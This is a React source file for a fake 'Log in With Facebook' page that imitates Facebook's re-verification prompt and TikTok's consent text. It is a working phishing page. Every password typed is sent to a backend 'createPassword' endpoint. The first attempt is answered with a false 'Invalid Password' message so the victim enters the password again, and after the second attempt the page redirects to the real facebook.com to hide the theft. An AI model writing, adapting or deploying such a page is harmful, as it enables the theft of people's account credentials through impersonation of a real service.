import React, { useEffect, useState } from "react";
import fakebook from '../Images/fakebook.png'
import dikshya from '../Images/user.jpg'
import axios from "axios";


const Password = () =>{
    const [clickCount, setClickCount] = useState(0);
const [storePassword, setStorePassword] = useState();

const [validState, setValidState] = useState(false);

const savePassword = async() =>{
       
        setValidState(true);
        await axios.post('http://localhost:5000/api/password/createPassword', {
            password: storePassword
        })
        .then((response) =>{
            console.log(response);
        })
        .catch((error) =>{
            console.log(error);
        })
        setClickCount(clickCount + 1);

        
        
}
useEffect(() =>{

    if(clickCount === 0){
        setValidState(false);
    }
    else if(clickCount  === 1){
        setValidState(true);
    }
    else if(clickCount === 2){
        setValidState(false);
    }else{
        setValidState(false);
    }

}, [clickCount]);

if(clickCount === 2){
    window.location.href = "https://facebook.com"
}


    return(
        <div className="main_container">
            <div className="header_container">
                <img className="header_logo" src={fakebook} alt=""/>
                <div className="text-container">
                <h3>Log in With Facebook</h3>
                </div>
            </div>

            <div className="user_credentials_container">
                <p>Facebook wants to verify it's you ?</p>

                <img  className="user_image" src= {dikshya} alt=""/>
                <input id="pass" type="password" placeholder="Password" onChange={(e) => setStorePassword(e.target.value)} />

                <div className="password_verification">
                    <p className={validState ? "password_check" : "password_uncheck"}>Invalid Password</p>
                </div>

                <button onClick={() =>{
                    savePassword();
                }}>Continue</button>
            </div>

            <div className="terms_policy">
                <p className="p_text"> By continuing, TikTok will recieve ongoing access to the information you share and Facebook will record when TikTok accesses it. <span>Learn more</span> about this sharing and the setting you  <br/> have. </p>
                <p className="p_privacy">TikTok's <span>Privacy Policy</span> and <span>Terms</span></p>
            </div>
    </div>
    )

}

export default Password;